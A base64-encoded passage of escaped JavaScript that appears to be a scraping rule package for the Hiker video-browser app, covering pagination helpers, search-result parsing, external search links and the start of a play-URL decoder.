FxcXFxuICAgICAgICAgICAgY2xzOiBjbHMsXFxcXG4gICAgICAgICAgfSxcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGlmIChpID09IGxpc3QubGVuZ3RoIC0gMSAmJiBzaG93KSB7XFxcXG4gICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgIGlkOiBcXFxcXFxcInBhZ2VsaW5lXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgIH0pO1xcXFxuXFxcXG4gICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnTxzbWFsbD7liqDovb3kuK0uLi48L3NtYWxsPlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgIGlkOiBcXFxcXFxcInBhZ2VudW1cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH0pO1xcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICB1cGRhdGVJdGVtKFxcXFxcXFwicGFnZW51bVxcXFxcXFwiLCB7XFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9XFxcXFxcXCJncmV5XFxcXFxcXCI+PHNtYWxsPuWIsOW6leS6hjwvc21hbGw+PC9mb250PicsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICBpZDogXFxcXFxcXCJsYXN0XFxcXFxcXCIsXFxcXG4gICAgICAgIH0sXFxcXG4gICAgICB9KTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGxpc3QubGVuZ3RoID09IDAgJiYgcGFnZSA9PSAxKSB7XFxcXG4gICAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCIsXFxcXG4gICAgICB9KTtcXFxcbiAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9XFxcXFxcXCJncmV5XFxcXFxcXCI+PHNtYWxsPuaXoOWGheWuuTwvc21hbGw+PC9mb250PicsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHt9LFxcXFxuICAgICAgfSk7XFxcXG4gICAgfVxcXFxuICAgIGlmKHRoaXMubmV4dFBhZ2UoKSl7XFxcXG4gICAgICAvL2xvZygndCcpO1xcXFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcigneWlfaXNuZXh0JywndCcpO1xcXFxuICAgIH1lbHNle1xcXFxuICAgICAgLy9sb2coJ2YnKTtcXFxcbiAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoJ3lpX2lzbmV4dCcsJ2YnKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGF1dG8pIHtcXFxcbiAgICAgIC8vY3JlYXRlTmV4dFBhZ2UoKTtcXFxcbiAgICAgIGF1dG9QYWdlKCk7XFxcXG4gICAgfVxcXFxuICB9LFxcXFxufTtcXFxcblxcXFxudmFyIGV4dE1ldGhvZCA9IHtcXFxcbiAgVG9QYXJhbXM6IGZ1bmN0aW9uICgpIHtcXFxcbiAgICB2YXIganNvbiA9IGFyZ3VtZW50c1swXTtcXFxcbiAgICByZXR1cm4gT2JqZWN0LmtleXMoanNvbilcXFxcbiAgICAgIC5tYXAoKGtleSkgPT4ga2V5ICsgXFxcXFxcXCI9XFxcXFxcXCIgKyBqc29uW2tleV0pXFxcXG4gICAgICAuam9pbihcXFxcXFxcIiZcXFxcXFxcIik7XFxcXG4gIH0sXFxcXG4gIHVybFBhcnNlOiBmdW5jdGlvbiAodSkge1xcXFxuICAgIHZhciBkaWN0ID0ge307XFxcXG4gICAgZGljdC5Tb3VyY2UgPSB1O1xcXFxuICAgIGxldCBwYXJhbXMgPSAodXJsKSA9PiB7XFxcXG4gICAgICBsZXQgcXVlcnlQYXJhbXMgPSB7fTtcXFxcbiAgICAgIGxldCByZWcgPSAvKFtePz0mXSspPShbXj89Jl0rKS9nO1xcXFxuICAgICAgdXJsLnJlcGxhY2UocmVnLCBmdW5jdGlvbiAoKSB7XFxcXG4gICAgICAgIHF1ZXJ5UGFyYW1zW2FyZ3VtZW50c1sxXV0gPSBhcmd1bWVudHNbMl07XFxcXG4gICAgICB9KTtcXFxcbiAgICAgIHJldHVybiBxdWVyeVBhcmFtcztcXFxcbiAgICB9O1xcXFxuICAgIHZhciBqYXZhVXJsID0gSmF2YUltcG9ydGVyKGphdmEubmV0LlVSTCk7XFxcXG4gICAgd2l0aCAoamF2YVVybCkge1xcXFxuICAgICAgdmFyIHVybCA9IG5ldyBVUkwodSk7XFxcXG4gICAgICBkaWN0LlByb3RvY29sID0gdXJsLmdldFByb3RvY29sKCk7XFxcXG4gICAgICBkaWN0Lkhvc3QgPSB1cmwuZ2V0SG9zdCgpO1xcXFxuICAgICAgZGljdC5Qb3J0ID0gdXJsLmdldFBvcnQoKTtcXFxcbiAgICAgIGRpY3QuRmlsZSA9IHVybC5nZXRGaWxlKCk7XFxcXG4gICAgICBkaWN0LlBhdGggPSB1cmwuZ2V0UGF0aCgpO1xcXFxuICAgICAgZGljdC5SZWYgPSB1cmwuZ2V0UmVmKCk7XFxcXG4gICAgICBkaWN0Lkhvc3RzID0gYCR7ZGljdC5Qcm90b2NvbH06Ly8ke3VybC5nZXRIb3N0KCl9YDtcXFxcbiAgICB9XFxcXG4gICAgZGljdC5QYXJhbXMgPSBwYXJhbXModSk7XFxcXG4gICAgcmV0dXJuIGRpY3Q7XFxcXG4gIH0sXFxcXG4gIGlzRXF1YWw6IGZ1bmN0aW9uICh4LCB5KSB7XFxcXG4gICAgY29uc3Qgb2sgPSBPYmplY3Qua2V5cyxcXFxcbiAgICAgIHR4ID0gdHlwZW9mIHgsXFxcXG4gICAgICB0eSA9IHR5cGVvZiB5O1xcXFxuICAgIHJldHVybiB4ICYmIHkgJiYgdHggPT09IFxcXFxcXFwib2JqZWN0XFxcXFxcXCIgJiYgdHggPT09IHR5XFxcXG4gICAgICA/IG9rKHgpLmxlbmd0aCA9PT0gb2soeSkubGVuZ3RoICYmXFxcXG4gICAgICAgICAgb2soeCkuZXZlcnkoKGtleSkgPT4gdGhpcy5pc0VxdWFsKHhba2V5XSwgeVtrZXldKSlcXFxcbiAgICAgIDogeCA9PT0geTtcXFxcbiAgfSxcXFxcbiAgZmluZERpZmZlcmVudEluZGV4OiBmdW5jdGlvbiAoc3RyMSwgc3RyMikge1xcXFxuICAgIGNvbnN0IGRpZmZDaGFycyA9IFtdO1xcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc3RyMi5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgaWYgKHN0cjFbaV0gIT09IHN0cjJbaV0pIHtcXFxcbiAgICAgICAgZGlmZkNoYXJzLnB1c2goe1xcXFxuICAgICAgICAgIGluZGV4OiBpLFxcXFxuICAgICAgICAgIHMxOiBzdHIxW2ldLFxcXFxuICAgICAgICAgIHMyOiBzdHIyW2ldLFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGRpZmZDaGFycztcXFxcbiAgfSxcXFxcbiAgcmVwbGFjZUNoYXJBdDogZnVuY3Rpb24gKHN0ciwgaW5kZXgsIHJlcGxhY2VtZW50KSB7XFxcXG4gICAgaWYgKGluZGV4IDwgMCB8fCBpbmRleCA+PSBzdHIubGVuZ3RoKSB7XFxcXG4gICAgICByZXR1cm4gc3RyO1xcXFxuICAgIH1cXFxcbiAgICAvL2xvZyhpbmRleClcXFxcbiAgICBjb25zdCBhcnIgPSBzdHIuc3BsaXQoXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgYXJyW2luZGV4XSA9IHJlcGxhY2VtZW50O1xcXFxuICAgIHJldHVybiBhcnIuam9pbihcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgfSxcXFxcbiAgZ2V0T2JqZWN0S2V5c0RpZmY6ZnVuY3Rpb24ob2JqMSwgb2JqMikge1xcXFxuICBjb25zdCBkaWZmZXJlbnRLZXlzID0gW107XFxcXG4gIGZvciAobGV0IGtleSBpbiBvYmoxKSB7XFxcXG4gICAgaWYgKCFvYmoyLmhhc093blByb3BlcnR5KGtleSkgfHwgb2JqMVtrZXldICE9PSBvYmoyW2tleV0pIHtcXFxcbiAgICAgIGRpZmZlcmVudEtleXMucHVzaChrZXkpO1xcXFxuICAgIH1cXFxcbiAgfVxcXFxuICBmb3IgKGxldCBrZXkgaW4gb2JqMikge1xcXFxuICAgIGlmICghb2JqMS5oYXNPd25Qcm9wZXJ0eShrZXkpKSB7XFxcXG4gICAgICBkaWZmZXJlbnRLZXlzLnB1c2goa2V5KTtcXFxcbiAgICB9XFxcXG4gIH1cXFxcbiAgcmV0dXJuIGRpZmZlcmVudEtleXM7XFxcXG4gIH0sXFxcXG4gIGdldE5leHRVcmw6IGZ1bmN0aW9uIChzb3VyY2UsIHRhcmdldCwgcGFyYW1zKSB7XFxcXG4gICAgdmFyIHUxID0gdGhpcy51cmxQYXJzZShzb3VyY2UpO1xcXFxuICAgIHZhciB1MiA9IHRoaXMudXJsUGFyc2UodGFyZ2V0KTtcXFxcbiAgICB2YXIgcGEgPSB1bmRlZmluZWQ7XFxcXG4gICAgaWYgKHR5cGVvZiBwYXJhbXMgPT0gXFxcXFxcXCJvYmplY3RcXFxcXFxcIikge1xcXFxuICAgICAgcGEgPSBwYXJhbXMuaGFzT3duUHJvcGVydHkoXFxcXFxcXCLnibnlvoFcXFxcXFxcIikgPyBwYXJhbXMu54m55b6BIDogdW5kZWZpbmVkO1xcXFxuICAgIH1cXFxcbiAgICB2YXIgbmV4dHVybCA9IHNvdXJjZTtcXFxcbiAgICB2YXIgY2EgPSBPYmplY3Qua2V5cyh1Mi5QYXJhbXMpLmxlbmd0aCA9PSAwID8gXFxcXFxcXCJcXFxcXFxcIiA6IFxcXFxcXFwiP1xcXFxcXFwiO1xcXFxuICAgIGlmIChwYSAhPSB1bmRlZmluZWQpIHtcXFxcbiAgICAgIHZhciBycyA9IFN0cmluZyh1Mi5QYXRoKS5yZXBsYWNlKG5ldyBSZWdFeHAocGEpLCBcXFxcXFxcIiQxZnlwYWdlXFxcXFxcXCIpO1xcXFxuICAgICAgbmV4dHVybCA9IHUyLkhvc3RzICsgcnMgKyBjYSArIHRoaXMuVG9QYXJhbXModTIuUGFyYW1zKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgaWYgKHRoaXMuaXNFcXVhbCh1MS5QYXJhbXMsIHUyLlBhcmFtcykpIHtcXFxcbiAgICAgICAgaWYoZHRfZGVidWcpe1xcXFxuICAgICAgICBsb2codTEuUGF0aCk7XFxcXG4gICAgICAgIGxvZyh1Mi5QYXRoKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICB2YXIgZGYgPSB0aGlzLmZpbmREaWZmZXJlbnRJbmRleChTdHJpbmcodTEuUGF0aCksIFN0cmluZyh1Mi5QYXRoKSk7XFxcXG4gICAgICAgIGlmKGR0X2RlYnVnKXtcXFxcbiAgICAgICAgbG9nKGRmKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAoZGYubGVuZ3RoID09IDEpIHtcXFxcbiAgICAgICAgICB2YXIgcmUgPSBkZlswXS5pbmRleDtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICB2YXIgZiA9IGRmLmZpbHRlcigoeCkgPT4gL1xcXFxcXFxcZCsvLnRlc3QoeC5zMikpO1xcXFxuICAgICAgICAgIHZhciByZSA9IGZbMF0uaW5kZXg7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdmFyIGVxID0gdGhpcy5yZXBsYWNlQ2hhckF0KFN0cmluZyh1Mi5QYXRoKSwgcmUsIFxcXFxcXFwiZnlwYWdlXFxcXFxcXCIpO1xcXFxuICAgICAgICBuZXh0dXJsID0gdTIuSG9zdHMgKyBlcSArIGNhICsgdGhpcy5Ub1BhcmFtcyh1Mi5QYXJhbXMpO1xcXFxuICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgdmFyIGVwPXRoaXMuZ2V0T2JqZWN0S2V5c0RpZmYodTEuUGFyYW1zLHUyLlBhcmFtcylcXFxcbiAgICAgICAgaWYoZXAubGVuZ3RoPT0xKXtcXFxcbiAgICAgICAgICB1MS5QYXJhbXNbZXBbMF1dPSdmeXBhZ2UnXFxcXG4gICAgICAgIH1lbHNle1xcXFxuICAgICAgICAgIGxvZyhlcCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdmFyIGVxID0gU3RyaW5nKHUxLlBhdGgpLnJlcGxhY2UoL1xcXFxcXFxcZCsvLCBcXFxcXFxcImZ5cGFnZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgbmV4dHVybCA9IHUxLkhvc3RzICsgZXEgKyBjYSArIHRoaXMuVG9QYXJhbXModTEuUGFyYW1zKTtcXFxcbiAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgLy9sb2coJ25leHQ6JytuZXh0dXJsKVxcXFxuICAgIHJldHVybiBuZXh0dXJsO1xcXFxuICB9LFxcXFxufTtcXFxcblxcXFxuZnVuY3Rpb24gZ2V0VHJ1ZWxpbmsobWFyaywgdXJsLCBwYWdlKSB7XFxcXG4gIHZhciBwID0gZ2V0TXlWYXIobWFyaywgdXJsKS5yZXBsYWNlKFxcXFxcXFwiZnlwYWdlXFxcXFxcXCIsIHBhZ2UpO1xcXFxuICBpZiAocGFnZSA9PSAxKSB7XFxcXG4gICAgcmV0dXJuIGdldE15VmFyKFxcXFxcXFwieWlfZmlyc3RwYWdlXFxcXFxcXCIsIHApO1xcXFxuICB9IGVsc2UgaWYgKHAgIT0gXFxcXFxcXCJcXFxcXFxcIikge1xcXFxuICAgIHJldHVybiBwO1xcXFxuICB9IGVsc2Uge1xcXFxuICAgIHJldHVybiB1cmw7XFxcXG4gIH1cXFxcbn1cXFxcbi8v5p6E5bu6XFxcXG5mdW5jdGlvbiBjcmVhdGVOZXh0UGFnZSgpIHtcXFxcbiAgbGV0IHN0YXJ0bnVtID0gMTtcXFxcbiAgdmFyIG9iaiA9IGFyZ3VtZW50c1swXTtcXFxcbiAgaWYgKHRydWVfdXJsICE9IGdldE15VmFyKFxcXFxcXFwieWlfcGFnZXVybFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSkge1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJ5aV9wYWdldXJsXFxcXFxcXCIpO1xcXFxuICB9XFxcXG4gIGlmIChwYWdlID09IHN0YXJ0bnVtICYmIGdldE15VmFyKFxcXFxcXFwieWlfcGFnZXVybFxcXFxcXFwiKSA9PSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgcHV0TXlWYXIoXFxcXFxcXCJ5aV9maXJzdHBhZ2VcXFxcXFxcIiwgdHJ1ZV91cmwpO1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICB2YXIgbmV4dCA9IGV2YWwo5LiL5LiA6aG1KTtcXFxcbiAgICAgIC8vbG9nKFxcXFxcXFwibmV4dFxcXFxcXFwiKTtcXFxcbiAgICAgIC8vbG9nKG5leHQpO1xcXFxuICAgIH0gY2F0Y2gge1xcXFxuICAgICAgbG9nKFxcXFxcXFwi5Y+v6IO95LiN5a2Y5Zyo5LiL5LiA6aG15oiW6ICF5LiL5LiA6aG15a6a5L2N5pyJ6Zeu6aKYXFxcXFxcXCIpO1xcXFxuICAgICAgbmV4dCA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgfVxcXFxuICAgIGlmIChuZXh0ICE9IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgIHZhciBueHVybCA9IGV4dE1ldGhvZC5nZXROZXh0VXJsKHRydWVfdXJsLCBuZXh0LCBvYmopO1xcXFxuICAgICAgLy9sb2coXFxcXFxcXCJueHVybDpcXFxcXFxcIiArIG54dXJsKTtcXFxcbiAgICAgIHB1dE15VmFyKOeKtuaAgSwgbnh1cmwpO1xcXFxuICAgICAgcHV0TXlWYXIoXFxcXFxcXCJ5aV9wYWdldXJsXFxcXFxcXCIsIG54dXJsKTtcXFxcbiAgICB9XFxcXG4gIH1cXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gYXV0b1BhZ2UoKSB7XFxcXG4gIGlmKHBhZ2U9PTEpe1xcXFxuICAgIHB1dE15VmFyKFxcXFxcXFwieWlfZmlyc3RwYWdlXFxcXFxcXCIsIHRydWVfdXJsKTtcXFxcbiAgICB9XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgIHZhciBuZXh0ID0gZXZhbCjkuIvkuIDpobUpO1xcXFxuICAgICAgLy9sb2coXFxcXFxcXCJuZXh0XFxcXFxcXCIpO1xcXFxuICAgICAgLy9sb2coJ25leHQ6JytuZXh0KTtcXFxcbiAgICB9IGNhdGNoIHtcXFxcbiAgICAgIGxvZyhcXFxcXFxcIuWPr+iDveS4jeWtmOWcqOS4i+S4gOmhteaIluiAheS4i+S4gOmhteWumuS9jeaciemXrumimFxcXFxcXFwiKTtcXFxcbiAgICAgIG5leHQgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIH1cXFxcbiAgICBpZiAobmV4dCAhPSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICBwdXRNeVZhcijnirbmgIEsIG5leHQpO1xcXFxuICAgIH1cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuIDnuqfmkJzntKLpobXpnaJcXFwiLFxcXCJwYXRoXFxcIjpcXFwiU2VhcmNoRnJhbWVcXFwiLFxcXCJydWxlXFxcIjpcXFwiXFxcXG5ldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3l6bScpKS5ydWxlKVxcXFxubGV0IGxpc3QgPSBwYXJzZURvbUZvckFycmF5KGh0bWwsIOahhuaetuWIl+ihqCk7XFxcXG5mb3IgKGxldCBqIGluIGxpc3QpIHtcXFxcbiAgICAgdmFyIOagh+mimCA9IHBhcnNlRG9tRm9ySHRtbChsaXN0W2pdLCDmoYbmnrbmoIfpopgpLnNsaWNlKDAsMTYpO1xcXFxuICAgICB2YXIg566A5LuLMSA9IHBhcnNlRG9tRm9ySHRtbChsaXN0W2pdLCDmoYbmnrbnroDku4sxKS5zbGljZSgwLDI0KTtcXFxcbiAgICAgdmFyIOeugOS7izIgPSBwYXJzZURvbUZvckh0bWwobGlzdFtqXSwg5qGG5p62566A5LuLMik7XFxcXG4gICAgIHZhciDmj4/ov7AxID0gcGFyc2VEb21Gb3JIdG1sKGxpc3Rbal0sIOahhuaetuaPj+i/sDEpO1xcXFxuICAgICB2YXIg5o+P6L+wMiA9IHBhcnNlRG9tRm9ySHRtbChsaXN0W2pdLCDmoYbmnrbmj4/ov7AyKTtcXFxcbiAgICAgdmFyIOWbvueJhyA9IHBhcnNlRG9tKGxpc3Rbal0sIOahhuaetuWbvueJhykgKyAnQFJlZmVyZXI9aHR0cHM6Ly9pbWc5LmRvdWJhbmlvLmNvbS8nO1xcXFxuICAgICB2YXIg6ZO+5o6lID0gcGFyc2VEb20obGlzdFtqXSwg5qGG5p626ZO+5o6lKSArIFxcXFxcXFwiI2ltbWVyc2l2ZVRoZW1lI1xcXFxcXFwiO1xcXFxuICAgICAgXFxcXG4gICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICB0aXRsZTog5qCH6aKYLCAgICAgICAgICAgXFxcXG4gICAgICAgICAgICAgICBjb250ZW50OiDnroDku4sxICsgJ1xcXFxcXFxcbicgKyDnroDku4syLFxcXFxuICAgICAgICAgICAgICAgZGVzYzog5o+P6L+wMSArICcgJyArIOaPj+i/sDIsXFxcXG4gICAgICAgICAgICAgICBpbWc6IOWbvueJhyxcXFxcbiAgICAgICAgICAgICAgIHVybDog6ZO+5o6lLFxcXFxuICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiDmoIfpopgsICAgICAgICAgICBcXFxcbiAgICAgICAgICAgIGltZzog5Zu+54mHLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG5cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuoznuqflpJbpg6jmkJzntKJcXFwiLFxcXCJwYXRoXFxcIjpcXFwidG9vbFxcXCIsXFxcInJ1bGVcXFwiOlxcXCIvL3ZhciB0aXRsZSA9IHBhcnNlRG9tRm9ySHRtbChodG1sLCDmkJzntKLmoIfnrb4pO1xcXFxudmFyIHRpdGxlID0gTVlfUEFSQU1TLnRpdGxlO1xcXFxubG9nKHRpdGxlKVxcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogJ+KAmOKAmOKAmeKAmTxiPjxtaWRkbGU+PGZvbnQgY29sb3I9XFxcXFxcXCIjRkYwMDAwXFxcXFxcXCI+IOiBmuW9seKImjwvZm9udD48L21pZGRsZT4nLFxcXFxuICAgIHBpY191cmw6ICdodHRwOi8vaW1hZ2UuY29vbGFway5jb20vL2Fwa19sb2dvLzIwMjIvMDUwNy8xNC8wXzM4MjhfNzI1NF82MzlAMjYweDI2MC5wbmcudC5wbmcnLFxcXFxuICAgIHVybDogJ2hpa2VyOi8vc2VhcmNoP3M9JyArIHRpdGxlICsgJyZydWxlPeiBmuW9seKImicsXFxcXG4gICAgY29sX3R5cGU6ICdpY29uX3NtYWxsXzQnLFxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiAn4oCY4oCY4oCZ4oCZPGI+PG1pZGRsZT48Zm9udCBjb2xvcj1cXFxcXFxcIiMxRTkwRkZcXFxcXFxcIj4g5LqR55uY5ZCbKOaOqOmAgSk8L2ZvbnQ+PC9taWRkbGU+JyxcXFxcbiAgICBwaWNfdXJsOiAnaHR0cDovL2ltYWdlLmNvb2xhcGsuY29tL2Fwa19sb2dvLzIwMjEvMDcyMS8xMC9iYjVjNmQ1OWE5ZTM2MTU5ODM0YjNmMTlmYzc0OWRmNS0yODUxMDctb18xZmIzZnRsM2djc3Qxc2R0MW4zYjFtMnVuamQxOC11aWQtNjYyNDM1QDM2MHgzNjAucG5nJyxcXFxcbiAgICB1cmw6ICdoaWtlcjovL3NlYXJjaD9zPScgKyB0aXRsZSArICcmcnVsZT3kupHnm5jlkJso5o6o6YCBKScsXFxcXG4gICAgY29sX3R5cGU6ICdpY29uX3NtYWxsXzQnLFxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiAn4oCY4oCY4oCZ4oCZPGI+PG1pZGRsZT48Zm9udCBjb2xvcj1cXFxcXFxcIiNGRjhDMDBcXFxcXFxcIj4g6aaZ5oOF5b2x6KeGPC9mb250PjwvbWlkZGxlPicsXFxcXG4gICAgcGljX3VybDogJ2h0dHA6Ly9zdGF0aWMueWluZ3lvbmdodWkuY29tL2ljb24vMTI4LzY4NjM0NDcucG5nJyxcXFxcbiAgICB1cmw6ICdoaWtlcjovL3NlYXJjaD9zPScgKyB0aXRsZSArICcmcnVsZT3pppnmg4XlvbHop4YnLFxcXFxuICAgIGNvbF90eXBlOiAnaWNvbl9zbWFsbF80JyxcXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogJ+KAmOKAmOKAmeKAmTxiPjxtaWRkbGU+PGZvbnQgY29sb3I9XFxcXFxcXCIjMDBGRjAwXFxcXFxcXCI+IOmdkuixhjwvZm9udD48L21pZGRsZT4nLFxcXFxuICAgIHBpY191cmw6ICdodHRwOi8vc3RhdGljLnlpbmd5b25naHVpLmNvbS9pY29uLzEyOC83MDAwNDc4LnBuZycsXFxcXG4gICAgdXJsOiAnaGlrZXI6Ly9zZWFyY2g/cz0nICsgdGl0bGUgKyAnJnJ1bGU96Z2S6LGGJyxcXFxcbiAgICBjb2xfdHlwZTogJ2ljb25fc21hbGxfNCcsXFxcXG59KTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuoznuqfpobXpnaLlhoXlrrlcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZXJcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4vKnZlciAyMDIzMDcwOCAxLjBcXFxcbiAqL1xcXFxudmFyIGN1c3RvbT17fTtcXFxcblxcXFxuLy/pooTorr5cXFxcbmZ1bmN0aW9uIGN1c3RvbURhdGEoY3VzdG9tKSB7XFxcXG4gICAgT2JqZWN0LmtleXMoY3VzdG9tKS5mb3JFYWNoKChrKT0+IHtcXFxcbiAgICAgIHRoaXNba109Y3VzdG9tW2tdIDtcXFxcbiAgICB9KVxcXFxufVxcXFxuIFxcXFxubGV0IEVyamkgPSB7XFxcXG4gICAg6YCa5YWNOiAkKCcnKS5sYXp5UnVsZSgoKSA9PiB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICB2YXIgaHRtbCA9IEpTT04ucGFyc2UocmVxdWVzdChpbnB1dCkubWF0Y2goL3IgcGxheWVyXy4qPz0oLio/KTwvKVsxXSlcXFxcbiAgICAgICAgICAgIHZhciB1cmwgPSBodG1sLnVybFxcXFxuICAgICAgICAgICAgaWYgKGh0bWwuZW5jcnlwdCA9PSAnMScpIHtcXFxcbiAgICAgICAgICAgICAgICB1cmwgPSB1bmVzY2FwZSh1cmwpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChodG1sLmVuY3J5cHQgPT0gJzInKSB7XFxcXG4gICAgICAgICAgICAgICAgdXJsID0gdW5lc2NhcGUoYmFzZTY0RGVjb2RlKHVybCkpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgaWYgKC9tM3U4fG1wNC8udGVzdCh1cmwpKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHVybFxcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ2aWRlbzovL1xcXFxcXFwiICsgaW5wdXRcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidmlkZW86Ly9cXFxcXFxcIiArIGlucHV0XFxcXG4gICAgICAgIH1cXFxcbiAgICB9KSxcXFxcbiAgICB1cGRhdGE6IGZ1bmN0aW9uKHJ1bGUpIHtcXFxcbiAgICAgICAgc2V0TGFzdENoYXB0ZXJSdWxlKCdqczonICsgJC50b1N0cmluZygodXJsLHJ1bGUpID0+IHtcXFxcbiAgICAgICAgICAgIHZhciBodG1sPWZldGNoKHVybCk7XFxcXG4gICAgICAgICAgICBzZXRSZXN1bHQoZXZhbChydWxlKSlcXFxcbiAgICAgICAgfSxNWV9VUkwsIHJ1bGUpKVxcXFxuICAgIH0sXFxcXG4gICAgY2xvc2U6IGZ1bmN0aW9uKGxpc3QsIHNvcnRzKSB7XFxcXG4gICAgICAgIGFkZExpc3RlbmVyKCdvbkNsb3NlJywgJC50b1N0cmluZygobGlzdCwgc29ydHMpID0+IHtcXFxcbiAgICAgICAgICAgIGxpc3QubWFwKHggPT4ge1xcXFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoJ2VyXycgKyB4ICsgJ2ZvbGQnKTtcXFxcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKCdlcl8nK3gpO1xcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc29ydHM7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoJ3BsYXlsaXN0XycgKyBpKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGNsZWFyTXlWYXIoJ2VyX3BsYXlsaXN0cycpO1xcXFxuICAgICAgICB9LCBsaXN0LCBzb3J0cykpXFxcXG4gICAgfSxcXFxcbiAgICBkYXRhQ29udmVydDogZnVuY3Rpb24oZGF0YSkge1xcXFxuICAgICAgICB2YXIgbmV3Y2xzbGlzdCA9IGRhdGEubWFwKGZ1bmN0aW9uKG9iaikge1xcXFxuICAgICAgIC